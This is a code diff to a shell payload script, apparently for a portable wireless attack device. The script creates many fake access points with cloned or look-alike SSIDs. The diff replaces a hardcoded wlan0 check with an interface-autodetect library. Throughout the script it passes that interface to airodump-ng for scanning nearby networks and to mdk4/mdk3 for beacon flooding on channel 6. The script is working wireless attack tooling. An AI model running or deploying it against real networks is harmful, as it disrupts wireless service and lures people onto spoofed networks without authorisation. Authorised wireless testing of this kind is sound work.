@@ -4,6 +4,11 @@
 # Description: Creates multiple fake APs with confusing/similar SSIDs
 # Category: nullsec
 
+# Autodetect the right wireless interface (exports $IFACE).
+# Falls back to showing the pager error dialog if nothing is plugged in.
+. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
+nullsec_require_iface || exit 1
+
 PROMPT "WIFI CONFUSER
 
 Creates multiple fake APs
@@ -17,8 +22,6 @@ Options:
 - Channel flooding
 
 Press OK to configure."
-
-[ ! -d "/sys/class/net/wlan0" ] && { ERROR_DIALOG "wlan0 not found!"; exit 1; }
 
 PROMPT "SELECT MODE:
 
@@ -56,7 +59,7 @@ rm -f /tmp/ssid_list.txt
 
 case $MODE in
     1) # Clone nearby
-        timeout 10 airodump-ng wlan0 --write-interval 1 -w /tmp/nearby --output-format csv 2>/dev/null
+        timeout 10 airodump-ng $IFACE --write-interval 1 -w /tmp/nearby --output-format csv 2>/dev/null
         grep -oE '"[^"]+' /tmp/nearby*.csv 2>/dev/null | tr -d '"' | sort -u > /tmp/ssid_list.txt
         ;;
     2) # Typo variants
@@ -88,10 +91,10 @@ SPINNER_STOP
 # Use mdk3/mdk4 for beacon flood
 if command -v mdk4 >/dev/null 2>&1; then
     LOG "Using mdk4..."
-    mdk4 wlan0 b -f /tmp/ssid_list.txt -c 6 &
+    mdk4 $IFACE b -f /tmp/ssid_list.txt -c 6 &
 elif command -v mdk3 >/dev/null 2>&1; then
     LOG "Using mdk3..."
-    mdk3 wlan0 b -f /tmp/ssid_list.txt -c 6 &
+    mdk3 $IFACE b -f /tmp/ssid_list.txt -c 6 &
 else
     ERROR_DIALOG "mdk3/mdk4 not found!"
     exit 1
